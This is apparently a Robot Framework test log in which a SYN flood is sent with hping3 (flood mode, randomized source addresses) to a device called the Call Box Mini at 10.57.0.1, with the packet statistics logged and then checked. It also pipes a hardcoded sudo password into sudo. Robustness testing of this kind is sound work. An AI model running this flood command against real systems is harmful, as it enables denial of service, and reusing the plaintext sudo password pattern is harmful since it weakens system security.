test.name: Send SYN flood using hping3

kw.name: Run Process
kw.msg: Starting process: echo toor | sudo -S timeout 6s hping3 -c 100 -d 120 -S -w 64 -p 80 --flood --rand-source 10.57.0.1
kw.doc: Runs a process and waits for it to complete.

kw.name: Log
kw.msg:
[sudo] password for exceeding: hping in flood mode, no replies will be shown
--- 10.57.0.1 hping statistic --- 835114 packets transmitted, 0 packets received, 100% packet loss round-trip min/avg/max = 0.0/0.0/0.0 ms HPING 10.57.0.1 (enp2s0f1 10.57.0.1): S set, 40 headers + 120 data bytes
kw.doc: Logs the given message with the given level.

kw.name: Log
kw.msg:
[sudo] password for exceeding: hping in flood mode, no replies will be shown
--- 10.57.0.1 hping statistic --- 835114 packets transmitted, 0 packets received, 100% packet loss round-trip min/avg/max = 0.0/0.0/0.0 ms HPING 10.57.0.1 (enp2s0f1 10.57.0.1): S set, 40 headers + 120 data bytes
kw.doc: Logs the given message with the given level.

kw.name: Evaluate
kw.arg: "100% packet loss" in """${output.stdout}""" or "100% unanswered" in """${output.stderr}"""
kw.doc: Evaluates the given expression in Python and returns the result.

kw.name: Should Be True
kw.arg: "Expected 100% packet loss, but some responses were received."
kw.doc: Fails if the given condition is not true.

test.doc: Run SYN flood attack to the Call Box Mini and capture the output
